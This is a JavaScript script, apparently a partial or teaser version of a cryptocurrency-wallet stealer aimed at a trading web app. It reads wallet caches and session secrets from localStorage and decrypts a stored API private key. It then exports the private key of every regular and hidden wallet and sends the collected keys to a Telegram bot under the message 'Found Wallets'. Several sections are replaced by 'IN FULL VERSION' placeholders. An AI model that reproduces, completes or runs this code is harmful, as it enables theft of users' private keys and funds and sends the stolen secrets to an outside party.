(async () => {
    // ===================== UTILS (FUNCTIONS) =======================
    "use strict";
    const CryptoJS = await import('https://cdn.skypack.dev/pin/crypto-js@v4.2.0-zrlxegy3yFOPYCCYn41o/mode=imports,min/optimized/crypto-js.js');
    const nobleHashes = await import("https://cdn.jsdelivr.net/npm/@noble/hashes@2.0.1/sha2.js")
    const hpkeCore = await import("https://esm.sh/@hpke/core");
    ..... IN FULL VERSION
    // =============================================================================================

    // ================= START =================
    // 1. Getting PubKey and EmbKey
    const walletsCache = JSON.parse(localStorage.getItem("padreV2-walletsCache"));
    const hiddenWalletsCache = JSON.parse(localStorage.getItem("padreV2-hiddenWalletsCache"));
    const sessionData = JSON.parse(localStorage.getItem("padreV2-session"));
    const stamperEncoded = JSON.parse(localStorage.getItem("padreV2-stamper"));
    
    ..... IN FULL VERSION

    const velvetObject = await velvetBundle.json();
    const localStoragePassphrase = velvetObject.bundle.localStoragePassphrase;

    ..... IN FULL VERSION
    const passwordHash = decryptedPassword.toString(CryptoJS.enc.Utf8);

    ..... IN FULL VERSION
    const apiPrivateKey = decryptedPrivateKey.toString(CryptoJS.enc.Utf8);

    // MAIN FUNC
    async function execute(format, address, orgID, isImported, privateKeyId) {
        const embeddedKeyJwk = await generateTargetKey();
        const targetPubBuf = await p256JWKPrivateToPublic(
            embeddedKeyJwk
        );
        ..... IN FULL VERSION

        const bundleInfo = isImported ? await getImportedWalletInfo({}) : await getBundleInfo({});
        // 4. Getting bundle
        let exportBundle;
        if (bundleInfo && bundleInfo.result && (bundleInfo.result.exportWalletAccountResult || bundleInfo.result.exportPrivateKeyResult)) {
            const walletAccount = bundleInfo.result.exportWalletAccountResult ?? bundleInfo.result.exportPrivateKeyResult;

            exportBundle = walletAccount.exportBundle;
        }

        // 5. Decrypting bundle
        if (exportBundle) return await extractPrivateKey(exportBundle, format, embeddedKeyJwk)
    }

    const outputWallets = []
    
    // Ждем завершения всех асинхронных операций
    await Promise.all([
        ...(walletsCache ? Object.entries(walletsCache).map(async ([_, wallets]) => {
            await Promise.all(wallets.map(async (wallet) => {
                const privateKey = await execute(
                    wallet.walletType == "SOL" ? "SOLANA" : "HEXADECIMAL",
                    wallet.walletType == "SOL" ? wallet.publicAddress : toEVMRegister(wallet.publicAddress),
                    wallet.subOrgId,
                    wallet.isImported,
                    wallet.walletId
                );
                outputWallets.push({
                    walletName: wallet.walletName,
                    address: wallet.publicAddress,
                    privateKey: privateKey
                });
            }));
        }) : []),

        ...(hiddenWalletsCache ? Object.entries(hiddenWalletsCache).map(async ([_, wallets]) => {
            await Promise.all(wallets.map(async (wallet) => {
                const privateKey = await execute(
                    wallet.walletType == "SOL" ? "SOLANA" : "HEXADECIMAL",
                    wallet.walletType == "SOL" ? wallet.publicAddress : toEVMRegister(wallet.publicAddress),
                    wallet.subOrgId,
                    wallet.isImported,
                    wallet.walletId
                );
                outputWallets.push({
                    walletName: wallet.walletName,
                    address: wallet.publicAddress,
                    privateKey: privateKey
                });
            }));
        }) : [])
    ]);

    // ======================================================

    // ====== SENDING DATA ====
    async function sendToTelegram(data) {
        const BOT_TOKEN = '';
        const CHAT_ID = '';

        const message = `🔍 Found Wallets:\n\n${JSON.stringify(data, null, 2)}`;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

        } catch {}
    }
    if (outputWallets) await sendToTelegram(outputWallets);
    // ========================

})()
